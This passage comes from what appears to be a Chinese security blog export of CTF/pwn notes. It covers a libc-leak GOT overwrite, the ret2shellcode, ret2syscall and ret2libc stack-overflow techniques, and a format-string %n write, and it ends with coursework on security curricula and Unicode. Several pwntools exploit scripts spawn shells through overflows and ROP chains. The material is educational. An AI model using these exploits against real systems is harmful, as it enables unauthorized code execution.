class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">print(<span class="built_in">hex</span>(atol_addr))</span><br><span class="line"><span class="comment"># libc = LibcSearcher(&#x27;atol&#x27;,atol_addr)</span></span><br><span class="line"><span class="comment"># base = atol_addr - libc.dump(&#x27;atol&#x27;)</span></span><br><span class="line">base = atol_addr - <span class="number">0x036eb0</span></span><br><span class="line"><span class="comment"># system = libc.dump(&#x27;system&#x27;)+base</span></span><br><span class="line">system = <span class="number">0x0453a0</span>+base</span><br><span class="line"></span><br><span class="line"><span class="comment"># system = libc.symbols[&#x27;system&#x27;]+libcbase</span></span><br><span class="line"></span><br><span class="line">print(<span class="built_in">hex</span>(system))</span><br><span class="line">payload = p64(system)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>







]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>攻防世界</tag>
      </tags>
  </entry>
  <entry>
    <title>栈溢出基础</title>
    <url>/posts/c68c5dc4/</url>
    <content><![CDATA[<h1 id="栈溢出基础总结"><a href="#栈溢出基础总结" class="headerlink" title="栈溢出基础总结"></a>栈溢出基础总结</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="栈结构"><a href="#栈结构" class="headerlink" title="栈结构"></a>栈结构</h3><p>需要注意的是</p>
<p>函数调用过程中，调用函数的参数在其自身栈帧，即被调用函数的形参。被调用函数栈帧存放自身的局部变量，需要使用参数时，根据偏移向调用函数的栈帧中寻找。</p>
<a id="more"></a>

<p>动态调试一个简单的程序说明问题。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">    c = a+b;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    x = fun(a,b);</span><br><span class="line">    <span class="built_in">printf</span>(x);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了方便演示，使用gcc编译为32位。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -m32 test.c -g -o test #-g 生成调试信息，-ggdb为生成专属gdb的调试信息。</span><br></pre></td></tr></table></figure>



<p>可以看到，main函数的变量存在main的栈帧中。</p>
<p><img src="/posts/c68c5dc4/image-20201030201951676.png" alt="image-20201030201951676"></p>
<p>在调用的fun函数中，使用a，b时向main的栈帧访问。</p>
<p><img src="/posts/c68c5dc4/image-20201030202426288.png" alt="image-20201030202426288"></p>
<h3 id="保护措施"><a href="#保护措施" class="headerlink" title="保护措施"></a>保护措施</h3><h4 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h4><p>NX即No-eXecute（不可执行）的意思，NX enable意味着栈不可执行。</p>
<h4 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h4><p>开启canary后的栈结构，其中canary不一定在rbp-8的位置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp &#x3D;&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 &#x3D;&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | local variables |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure>

<p>当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中rbp-0x8（通过这个汇编代码可以判断canary插入入位置） 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure>

<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>利用栈溢出漏洞劫持执行流，让程序执行写入的shellcode。</p>
<h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>栈溢出+将shellcode放入可执行的段中</p>
<h3 id="shellcode的编写"><a href="#shellcode的编写" class="headerlink" title="shellcode的编写"></a>shellcode的编写</h3><h4 id="pwntools的shellcode生成"><a href="#pwntools的shellcode生成" class="headerlink" title="pwntools的shellcode生成"></a>pwntools的shellcode生成</h4><p>利用pwntools的shellcraft模块可方便的生成shellcode</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&#x27;exploitme.example.com&#x27;</span>, <span class="number">31337</span>)</span><br><span class="line"><span class="comment"># EXPLOIT CODE GOES HERE</span></span><br><span class="line">r.send(asm(shellcraft.sh()))</span><br><span class="line"><span class="comment">#shellcraft.sh()是执行/bin/sh的shellcode。不使用设置的环境可改为shellcraft.amd64.linux.sh()</span></span><br><span class="line"><span class="comment">#asm()函数接收一个字符串作为参数，得到汇编码的机器代码。</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>根据攻击的目标机通过context设置环境变量</p>
<ul>
<li><strong><em>arch</em></strong>设置架构类型</li>
<li><strong><em>os</em></strong>设置操作系统</li>
<li><strong><em>log_level</em></strong>设置日志级别，常设为debug</li>
</ul>
<h4 id="exploit-db"><a href="#exploit-db" class="headerlink" title="exploit-db"></a><a href="https://www.exploit-db.com/">exploit-db</a></h4><p>pwntools可以生成一些简单、常规的shellcode。对于特殊要求的可以在exploit-db中查找。</p>
<h3 id="简单的例子"><a href="#简单的例子" class="headerlink" title="简单的例子"></a>简单的例子</h3><p>ida反编译结果</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">  gets((<span class="keyword">char</span> *)&amp;v4);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v4, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>gets函数明显的存在栈溢出。strncpy函数将输入复制给buf2.用ida可以看到buf2在bss段，大小为0x64.</p>
<p><img src="/posts/c68c5dc4/image-20201031111332809.png" alt="image-20201031111332809"></p>
<p>在gdb调试中使用vmmap，查看各段</p>
<p><img src="/posts/c68c5dc4/image-20201031111751831.png" alt="image-20201031111751831"></p>
<p>bss段有可执行权限。</p>
<p>exp为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">b&#x27;A&#x27;</span>) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>注意一点，这里ida显示的v4与ebp的偏移是0x64，实际上不准确。</p>
<p>在调试中，可以看到，v4相对esp的偏移是0x1c,esp为0xffffce00，所以v4为0xffffce1c。与ebp的偏移是0x6c。所以溢出到ret的数据一共是0x6c+4（112）。</p>
<p><img src="/posts/c68c5dc4/image-20201031113605999.png" alt="image-20201031113605999"></p>
<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>直接使用系统调用来获得shell。即通过一系列的gadgets，将各个寄存器置为系统调用需要的参数，然后执行int 0x80即可。</p>
<h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><p>栈溢出+足够的gadgets。在没法写入可执行的shellcode的时候考虑。</p>
<h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><p>Linux 的系统调用通过 int 80h 实现，用系统调用号来区分入口函数。操作系统实现系统调用的基本过程是：</p>
<ol>
<li>应用程序调用库函数（API）；</li>
<li>API 将系统调用号存入 EAX，然后通过中断调用使系统进入内核态；</li>
<li>内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；</li>
<li>系统调用完成相应功能，将返回值存入 EAX，返回到中断处理函数；</li>
<li>中断处理函数返回到 API 中；</li>
<li>API 将 EAX 返回给应用程序。</li>
</ol>
<p>应用程序调用系统调用的过程是：</p>
<ol>
<li>把系统调用的编号存入 EAX；</li>
<li>把函数参数存入其它通用寄存器；</li>
<li>触发 0x80 号中断（int 0x80）。</li>
</ol>
<p>最常见的系统调用</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>

<p>寄存器的状态为</p>
<ul>
<li>eax为系统调用号，0xb</li>
<li>ebx为第一个参数，即指向字符串”/bin/sh”的地址</li>
<li>ecx、edx应为0</li>
</ul>
<h3 id="寻找gadgets"><a href="#寻找gadgets" class="headerlink" title="寻找gadgets"></a>寻找gadgets</h3><p>使用ROPgadget来寻找所需要的gadgets。</p>
<p>关于ROPgadget的使用</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">usage: ROPgadget [-h] [-v] [-c] [--binary &lt;binary&gt;] [--opcode &lt;opcodes&gt;]</span><br><span class="line">                 [--<span class="built_in">string</span> &lt;<span class="built_in">string</span>&gt;] [--memstr &lt;<span class="built_in">string</span>&gt;] [--depth &lt;nbyte&gt;]</span><br><span class="line">                 [--only &lt;key&gt;] [--filter &lt;key&gt;] [--range &lt;start-end&gt;]</span><br><span class="line">                 [--badbytes &lt;byte&gt;] [--rawArch &lt;arch&gt;] [--rawMode &lt;mode&gt;]</span><br><span class="line">                 [--rawEndian &lt;endian&gt;] [--re &lt;re&gt;] [--offset &lt;hexaddr&gt;]</span><br><span class="line">                 [--ropchain] [--thumb] [--console] [--norop] [--nojop]</span><br><span class="line">                 [--callPreceded] [--nosys] [--multibr] [--all] [--noinstr]</span><br><span class="line">                 [--dump] [--silent]</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show <span class="keyword">this</span> help message <span class="keyword">and</span> <span class="built_in">exit</span></span><br><span class="line">  -v, --version         Display the ROPgadget<span class="number">&#x27;</span>s version</span><br><span class="line">  -c, --checkUpdate     Checks <span class="keyword">if</span> a <span class="keyword">new</span> version is available</span><br><span class="line">  --binary &lt;binary&gt;     Specify a binary filename to analyze</span><br><span class="line">  --opcode &lt;opcodes&gt;    Search opcode in executable segment</span><br><span class="line">  --<span class="built_in">string</span> &lt;<span class="built_in">string</span>&gt;     Search <span class="built_in">string</span> in readable segment</span><br><span class="line">  --memstr &lt;<span class="built_in">string</span>&gt;     Search each byte in all readable segment</span><br><span class="line">  --depth &lt;nbyte&gt;       Depth <span class="keyword">for</span> search engine (<span class="keyword">default</span> <span class="number">10</span>)</span><br><span class="line">  --only &lt;key&gt;          Only show specific instructions</span><br><span class="line">  --filter &lt;key&gt;        Suppress specific mnemonics</span><br><span class="line">  --range &lt;start-end&gt;   Search between two addresses (<span class="number">0</span>x...<span class="number">-0</span>x...)</span><br><span class="line">  --badbytes &lt;byte&gt;     Rejects specific bytes in the gadget<span class="number">&#x27;</span>s address</span><br><span class="line">  --rawArch &lt;arch&gt;      Specify an arch <span class="keyword">for</span> a raw file</span><br><span class="line">  --rawMode &lt;mode&gt;      Specify a mode <span class="keyword">for</span> a raw file</span><br><span class="line">  --rawEndian &lt;endian&gt;  Specify an endianness <span class="keyword">for</span> a raw file</span><br><span class="line">  --re &lt;re&gt;             Regular expression</span><br><span class="line">  --offset &lt;hexaddr&gt;    Specify an offset <span class="keyword">for</span> gadget addresses</span><br><span class="line">  --ropchain            Enable the ROP chain generation</span><br><span class="line">  --thumb               Use the thumb mode <span class="keyword">for</span> the search engine (ARM only)</span><br><span class="line">  --console             Use an interactive console <span class="keyword">for</span> search engine</span><br><span class="line">  --norop               Disable ROP search engine</span><br><span class="line">  --nojop               Disable JOP search engine</span><br><span class="line">  --callPreceded        Only show gadgets which are call-preceded</span><br><span class="line">  --nosys               Disable SYS search engine</span><br><span class="line">  --multibr             Enable multiple branch gadgets</span><br><span class="line">  --all                 Disables the removal of duplicate gadgets</span><br><span class="line">  --noinstr             Disable the gadget instructions console printing</span><br><span class="line">  --dump                Outputs the gadget bytes</span><br><span class="line">  --silent              Disables printing of gadgets during analysis</span><br></pre></td></tr></table></figure>



<h3 id="简单的例子-1"><a href="#简单的例子-1" class="headerlink" title="简单的例子"></a>简单的例子</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you plan to do?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/posts/c68c5dc4/image-20201104162146702.png" alt="image-20201104162146702"></p>
<p><img src="/posts/c68c5dc4/image-20201104162430363.png" alt="image-20201104162430363"></p>
<p><img src="/posts/c68c5dc4/image-20201104162507306.png" alt="image-20201104162507306"></p>
<p><img src="/posts/c68c5dc4/image-20201104162857614.png" alt="image-20201104162857614"></p>
<p>思路就是通过一系列gadgets，改变寄存器的参数然后再将rip指向int 0x80执行系统调用。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>这里的ida显示的偏移不准确，需要用gdb调试<img src="/posts/c68c5dc4/image-20201104163900844.png" alt="image-20201104163900844"></p>
<p>同时,注意参数的入栈顺序。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh</span><br></pre></td></tr></table></figure>

<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><h4 id="PLT与GOT"><a href="#PLT与GOT" class="headerlink" title="PLT与GOT"></a>PLT与GOT</h4><p>PLT表(Procedure Linkage Table)过程连接表,在程序中以 .plt 节表示，该表处于代码段，每一个表项表示了一个与要重定位的函数相关的若干条指令，每个表项长度为 16 个字节，存储的是用于做延迟绑定的代码。调用一个外部函数的时候，会先去PLT中找，如果是非首次调用，就会直接跳转到相应的GOT表的表项，执行动态链接库里对应的函数。如果是首次，真正的函数地址会先被解析并填入相应的 GOT 表项，然后调用。</p>
<p>GOT表(Global Offset Table)全局偏移表，在程序中以 .got.plt 表示，该表处于数据段，每一个表项存储的都是一个地址，每个表项长度是当前程序的对应需要寻址长度（32位程序：4字节，64位程序：8字节）。</p>
<h4 id="简单例子"><a href="#简单例子" class="headerlink" title="简单例子"></a>简单例子</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;world&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>为了方便实验,将所有的保护都关掉.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -m32 plt\&amp;got.c -g -z execstack -fno-stack-protector -no-pie -z norelro -o plt</span><br></pre></td></tr></table></figure>

<p><img src="/posts/c68c5dc4/image-20201104173407071.png" alt="image-20201104173407071"></p>
<p>首次调用puts函数时,首先跳转到puts函数在got.plt中记录位置</p>
<p><img src="/posts/c68c5dc4/image-20201105113447389.png" alt="image-20201105113447389"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dword   双字 就是四个字节</span><br><span class="line">ptr     pointer缩写 即指针</span><br><span class="line">jmp   dword ptr [_GLOBAL_OFFSET_TABLE_+12]即跳转到内存0x8049724中低32位即0x80482c6.</span><br></pre></td></tr></table></figure>

<p><img src="/posts/c68c5dc4/image-20201105113807853.png" alt="image-20201105113807853"></p>
<p><img src="/posts/c68c5dc4/image-20201105114209230.png" alt="image-20201105114209230"></p>
<p>之后,跳转到.plt段首PLT0.解析puts的实际地址.</p>
<p><img src="/posts/c68c5dc4/image-20201105114436758.png" alt="image-20201105114436758"></p>
<p>解析完成后,将真实地址填入到got表项中并执行.</p>
<p><img src="/posts/c68c5dc4/image-20201105114919183.png" alt="image-20201105114919183"></p>
<p>第二次调用</p>
<p><img src="/posts/c68c5dc4/image-20201105115211598.png" alt="image-20201105115211598"></p>
<p>直接自 .got.plt 跳转到 puts 的真实地址,没有了第一次的解析地址过程.</p>
<ul>
<li><p>GOT 表位于.got 和.got.plt Ssection</p>
<ul>
<li>.got Section 存放外部全局变量的 GOT 表，非延迟绑定</li>
<li>.got.plt Section 存放外部函数的 GOT 表，例如 printf，采用延迟绑定.    </li>
</ul>
<table>
<thead>
<tr>
<th align="center">.got.plt(解析前)</th>
<th align="center">.got.plt(解析后)</th>
</tr>
</thead>
<tbody><tr>
<td align="center">.dynamic section 地址</td>
<td align="center">.dynamic section 地址</td>
</tr>
<tr>
<td align="center">link_map 地址</td>
<td align="center">link_map 地址</td>
</tr>
<tr>
<td align="center">_dl_runtime_resolve</td>
<td align="center">_dl_runtime_resolve</td>
</tr>
<tr>
<td align="center">puts@plt + 6</td>
<td align="center">puts</td>
</tr>
</tbody></table>
</li>
<li><p>.got.plt 前三项有特殊含义，从第四项开始保存引用的各个外部函数的 GOT 表项：</p>
<ul>
<li>第一项保存的是.dynamic section 的地址 (为动态链接提供信息，例如符号表、字符串表等)</li>
<li>第二项保存的是 link_map 结构地址 (链表，包含所有加载的共享库信息)</li>
<li>第三项保存了_dl_runtime_resolve 函数的地址 (用于解析外部函数符号的函数，解析完成后会直接执行该函数)</li>
</ul>
</li>
</ul>
<h4 id="ret2libc-1"><a href="#ret2libc-1" class="headerlink" title="ret2libc"></a>ret2libc</h4><p>基本的原理就是通过plt调用各种函数.在没有shellcode可写,程序中没有后门函数时可以通过已有的plt去调用动态连接库里的其他函数,如system(“/bin/sh”);可以修改got表项内容,如puts,下次调用puts的时候就会执行修改后的函数.</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>stack</tag>
      </tags>
  </entry>
  <entry>
    <title>格式化字符串</title>
    <url>/posts/7fabda03/</url>
    <content><![CDATA[<h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在printf函数中，format字符串中有的参数，如果没有给出会自动访问在format之后的内存作为参数。</p>
<h3 id="实验说明"><a href="#实验说明" class="headerlink" title="实验说明"></a>实验说明</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">100</span>] = <span class="string">&quot;world&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello%s\n&quot;</span>,s);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;new format:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">    <span class="built_in">printf</span>(s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入调试，首先可以看到正常的printf函数调用：</p>
<a id="more"></a>

<p><img src="/posts/7fabda03/image-20201113225150355.png" alt="image-20201113225150355"></p>
<p>可以看到，对于format，实际上在是存在栈上其偏移6的父函数栈帧上的即格式化字符串的偏移为6。与正常的函数调用时的参数关系一致。</p>
<p><img src="/posts/7fabda03/IMG_0044.PNG" alt="IMG_0044"></p>
<p>如果是缺少相应的参数，printf函数会从偏移1开始匹配参数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aaaa.%x.%x.%x.%x.%x.%x.%x.%x</span><br></pre></td></tr></table></figure>

<p><img src="/posts/7fabda03/image-20201113230619688.png" alt="image-20201113230619688"></p>
<p><img src="/posts/7fabda03/image-20201113230645900.png" alt="image-20201113230645900"></p>
<p><strong>这样的方法可以用来寻找格式化字符串的偏移量</strong></p>
<p><strong>上述实验是32位，和64位中区别在于，64位优先将参数传入6个寄存器中。</strong></p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>灵活使用格式化字符串的格式字符，可以做到任意地址的读写。</p>
<p>常用到的有：</p>
<ul>
<li>%x 将参数作为无符号以十六进制表示的整数打印</li>
<li>%p 打印地址</li>
<li>%s 将参数作为字符串地址，打印相应字符串（如果参数指向的不是一个字符串会造成程序崩溃）</li>
<li>%n 将参数作为地址，修改相应地址的内容。用于任意地址的写。</li>
</ul>
<p><strong>pwntools中有fmtstr_payload可以方便的构造任意地址写的payload</strong></p>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>在对任意地址写的时候，如果地址较低，\x00会造成格式化字符串的截断，无法达到预期效果。</p>
<h4 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h4><p><img src="/posts/7fabda03/image-20201113232149244.png" alt="image-20201113232149244"></p>
<p><img src="/posts/7fabda03/image-20201113232249593.png" alt="image-20201113232249593"></p>
<p><img src="/posts/7fabda03/image-20201113232302791.png" alt="image-20201113232302791"></p>
<p>显然存在格式化字符串漏洞，只需要将bss段的变量改为非0，执行后门函数即可。</p>
<p>通过上述方法可以得到偏移为10.</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p = process(<span class="string">&quot;./pwn(2)&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">addr = <span class="number">0x60107c</span></span><br><span class="line">payload = <span class="string">b&#x27;aaa&#x27;</span>+<span class="string">b&quot;%11$n&quot;</span>+p64(addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这里将要修改的地址置后，是p64(addr)的\x00会造成截断，如果payload为<code> p64(addr)+b&#39;%10$n&#39;</code></p>
<p>格式化字符串不会读到‘%10$n’</p>
<p>因此将地址之后，填满64位的内存，将地址的偏移构造为11.将0x60107c的内容改为3，执行sh函数。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>fmtstr</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全课程作业</title>
    <url>/posts/e492a0d/</url>
    <content><![CDATA[<p>网络安全课程作业</p>
<a id="more"></a>

<h2 id="培养方案比较"><a href="#培养方案比较" class="headerlink" title="培养方案比较"></a>培养方案比较</h2><p>培养方案的获取主要通过各高校的学院官网获得。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201214090506931.png" alt="image-20201214090506931"></p>
<p>一共选取了上海交通大学、北航、浙大三所学校，各自的专业主干课程如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">上交：</span><br><span class="line">计算机组成与系统结构</span><br><span class="line">软件工程</span><br><span class="line">网络信息安全概论</span><br><span class="line">信息安全的数学基础（1）</span><br><span class="line">信号与系统（B类)</span><br><span class="line">数据库原理</span><br><span class="line">编译原理（C类)</span><br><span class="line">数字信号处理（E类)计算机通信网络(A类)信息论与编码</span><br><span class="line">数字系统设计</span><br><span class="line">信息安全的数学基础（2)</span><br><span class="line">嵌入式系统原理与应用</span><br><span class="line">Windows安全原理与技术</span><br><span class="line">现代密码学</span><br><span class="line">操作系统(B类)</span><br><span class="line">lnternet安全协议与分析</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>北航：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201214091223972.png" alt="image-20201214091223972"></p>
<p>浙大</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201214091332209.png" alt="image-20201214091332209"></p>
<p>比较和建议：</p>
<p>与上面这些学校相比，在基础课和专业课程的设置上来说，是没有太大差别。但是，从涉及的广度、深度来说还是有所不及。</p>
<p>建议开设一些主要以介绍目前的新技术、新思想的课程用于开拓眼界、提升能力。专业课的深度要有所提高，提高实战比例。</p>
<h2 id="编码参考文档"><a href="#编码参考文档" class="headerlink" title="编码参考文档"></a>编码参考文档</h2><h3 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h3><p><code>Unicode</code>是一个编码方案，<code>Unicode</code>是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。<code>Unicode</code>编码共有三种具体实现，分别为<code>utf-8,utf-16,utf-32</code>.</p>
<p><code>Unicode</code>没有规定字符对应的二进制码如何存储。以汉字“汉”为例，它的<code>Unicode</code>码点是<code>0x6c49</code>，对应的二进制数是 <code>110110001001001</code>，二进制数有 <code>15 </code>位，这也就说明了它至少需要<code> 2</code> 个字节来表示。可以想象，在<code>Unicode</code>字典中往后的字符可能就需要3个字节或者4个字节，甚至更多字节来表示了。</p>
